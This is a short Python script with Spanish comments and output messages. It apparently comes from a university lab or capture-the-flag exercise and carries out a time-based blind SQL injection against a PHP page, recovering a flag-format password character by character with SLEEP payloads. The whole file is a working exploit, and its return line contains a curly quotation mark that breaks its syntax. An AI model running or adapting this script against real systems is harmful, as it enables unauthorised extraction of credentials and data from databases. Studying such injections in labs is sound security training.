import requests 
import string 
import time 

URL = "https://web01-segbd-gcib-vulnerable.numa.host/SQL/sql7.php?number=1&submit=Submit"   
PARAM_NAME = "number"   
DELAY = 10   
HEADERS = {"User-Agent": "Mozilla/5.0"}   
CHARSET = string.ascii_lowercase + string.digits + "_"   

def test_injection(payload): 
    start_time = time.time() 
    response = requests.get(URL, params={PARAM_NAME: payload}, headers=HEADERS) 
    elapsed_time = time.time() - start_time 
    return elapsed_time > DELAY  # Devuelve True si el retraso es mayor al umbral 
     
def extract_password(): 
    password = "URJC{"   
    for position in range(6, 21):   
        found = False 
        for char in CHARSET: 
            payload = f"1' AND (SELECT IF(SUBSTRING((SELECT password FROM s3cret WHERE 
password LIKE 'URJC%'), {position}, 1) = '{char}', SLEEP({DELAY}), 0)) -- " 
 
            if test_injection(payload): 
                password += char 
                print(f"[+] Encontrado carácter '{char}' en la posición {position}") 
                found = True 
                break 
 
        if not found: 
            print(f"[-] No se encontró ningún carácter válido en la posición {position}") 
            break 
 
    return password + “}” 
 
 
if __name__ == "__main__": 
    print("[*] Iniciando extracción de la contraseña...") 
    password = extract_password() 
    if password: 
        print(f"[+] Contraseña de administrador encontrada: {password}") 
    else: 
        print("[-] No se pudo determinar la contraseña.")
